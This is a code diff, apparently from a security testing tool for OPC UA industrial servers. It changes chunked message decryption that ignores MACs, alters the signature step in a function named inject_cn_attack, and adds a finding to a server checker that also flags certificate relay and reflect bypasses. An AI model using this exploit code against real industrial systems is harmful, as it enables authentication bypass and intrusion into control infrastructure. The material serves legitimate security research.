@@ -242,26 +242,28 @@ def session_exchange(channel : ChannelState,
   chunks = [reply.encodedPart for reply in chunkable_opc_exchange(channel.sock, msg)]
   
   # Decrypt/unsign if needed.
-  decoded = b''
+  respbytes = b''
   for chunk in chunks:
     if channel.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT:
       # Decrypt and unpad, while simply ignoring MAC.
       decrypted = aes_cbc_decrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, chunk)
       unsigned = decrypted[:-macsize(crypto.policy)]
-      decoded += pkcs7_unpad(unsigned, 16)[:-1] if not unsigned.endswith(b'\x00') else unsigned[:-1]
+      decoded = pkcs7_unpad(unsigned, 16)[:-1] if not unsigned.endswith(b'\x00') else unsigned[:-1]
     elif channel.securityMode == MessageSecurityMode.SIGN:
       # Just strip MAC.
-      decoded += chunk[:-macsize(crypto.policy)]
+      decoded = chunk[:-macsize(crypto.policy)]
     else:
       assert(channel.securityMode == MessageSecurityMode.NONE)
-      decoded += chunk
+      decoded = chunk
+    
+    convo, _ = encodedConversation.from_bytes(decoded)
+    respbytes += convo.requestOrResponse
 
   # Increment the message counter.
   channel.msg_counter += 1
     
   # Parse the response.
-  convo, _ = encodedConversation.from_bytes(decoded)
-  resp, _ = respfield.from_bytes(convo.requestOrResponse)
+  resp, _ = respfield.from_bytes(respbytes)
   return resp
   
 # OPC exchange over HTTPS.
@@ -1186,7 +1188,7 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
           requestHeader=simple_requestheader(createreply.authenticationToken),
           clientSignature=signatureData.create(
             algorithm=rsa_siguri(ep.securityPolicyUri),
-            signature=rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
+            signature=createreply.serverNonce and rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
           ),
           clientSoftwareCertificates=[],
           localeIds=[],
@@ -1382,6 +1384,10 @@ def server_checker(url : str, test_timing_attack : bool):
     # User cert relay.
     if relay_candidate and UserTokenType.CERTIFICATE in tokentypes:
       findings.append(f'{epname} supports user authentication with certificates. Could potentially also be bypassed via reflect or relay.')
+    
+    # Discovery warning.
+    if url not in ep.server.discoveryUrls:
+      findings.append('Requested URL not in endpoint discovery URL list. Maybe try checking one of the discovery URLs as well?')
     
     # Downgrade attacks. TODO: confirm
     # if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.USERNAME in tokentypes or UserTokenType.ISSUEDTOKEN in tokentypes:
